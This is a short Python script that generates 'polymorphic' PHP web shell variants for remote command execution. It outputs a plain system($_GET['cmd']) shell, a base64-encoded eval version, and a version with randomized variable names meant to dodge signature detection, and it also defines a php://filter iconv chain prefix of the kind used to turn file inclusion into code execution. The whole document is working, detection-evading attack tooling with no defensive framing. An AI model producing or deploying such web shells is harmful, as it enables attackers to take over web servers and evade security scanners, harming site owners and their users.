#!/usr/bin/env python3
"""Generates polymorphic PHP payload variants."""
import base64, random, string

def ws_basic(): return "<?php system($_GET['cmd']); ?>"

def ws_obf_b64():
    cmd = 'system($_GET["cmd"]);'
    enc = base64.b64encode(cmd.encode()).decode()
    return f'<?php eval(base64_decode("{enc}")); ?>'

def ws_var_names():
    v = ''.join(random.choices(string.ascii_lowercase, k=6))
    return f'<?php ${v}=$_GET["cmd"]; system(${v}); ?>'

def ws_filter_chain():
    return "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7/resource="

VARIANTS = [ws_basic, ws_obf_b64, ws_var_names]

def generate(n=5):
    return [random.choice(VARIANTS)() for _ in range(n)]

if __name__ == "__main__":
    for i, v in enumerate(generate(10)):
        print(f"[{i}] {v}")
